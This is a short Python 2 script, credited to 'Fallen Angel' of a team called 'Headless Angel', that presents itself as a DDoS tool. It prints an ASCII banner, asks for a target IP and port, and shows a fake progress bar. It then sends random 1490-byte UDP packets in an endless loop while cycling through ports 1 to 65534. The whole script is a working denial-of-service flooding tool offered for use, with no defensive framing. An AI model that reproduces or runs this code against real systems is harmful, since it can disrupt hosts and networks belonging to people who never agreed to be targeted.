import sys 

import os 

import time 

import socket

import random

#code Time

from datetime import datetime

now = datetime.now()

hour = now.hour

minute = now.minute

day = now.day

month = now.month

year = now.year




##############

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

#############




os.system("clear")
print
print("\033[1;31;40m__  __   _____      _     ____     _      _____   ____   ____        _      _   _    ____   _____   _          ____    ____     ___     ____    \n")
print("\033[1;31;40m| | | | | ____|    / \    |  _ \  | |    | ____| / ___/ / ___/      / \    | \ | |  / ___| | ____| | |        |  _ \  |  _ \   / _ \   / ___/    \n")
print("\033[1;31;40m| |_| | |  _|     / _ \   | | | | | |    |  _|   \___ \ \___  \    / _ \   |  \| | | |  _  |  _|   | |        | |_| | | |_| | | | | |  \___ \     \n")
print("\033[1;31;40m|  _  | | |___   / ___ \  | |_| | | |___ | |___   ___) |  ___) |  / ___ \  | |\  | | |_| | | |___  | |___     | |_| | | |_| | | |_| |  ___) |      \n")
print("\033[1;31;40m|_| |_| |_____| /_/   \_\ \____/  |_____||_____| |____/  |____/  /_/   \_\ |_| \_|  \____| |_____| |_____|    |____/  |____/   \___/  |____/        \n")

print
print ("Author   : Fallen Angel")

print ("Team : Headless Angel")

print 

ip = raw_input("Target IP : ")

port = input("Enter Port    : ")




os.system("clear")

os.system("figlet HA DDOS Running")

print ("[+]--                        [+]0% ")

time.sleep(2)

print ("[+]-xxxx>                    [+]25%")

time.sleep(2)

print ("[+]-xxxxxxx>                 [+]50%")

time.sleep(3)

print ("[+]-xxxxxxxxx>               [+]75%")

time.sleep(2)

print ("[+]-xxxxxxxxxxxxxx>          [+]100%")

time.sleep(2)

sent = 0

while True:

    sock.sendto(bytes, (ip,port))

    sent = sent + 1

    port = port + 1

    print ("\033[1;31;40mHeadlessAngel \033[1;34;40m:-Sent \033[1;31;40m%s \033[1;34;40mpacket \033[1;31;40mto \033[1;34;40m%s \033[1;31;40mthrough \033[1;34;40mport:\033[1;31;40m%s")%(sent,ip,port)

    if port == 65534:

        port = 1
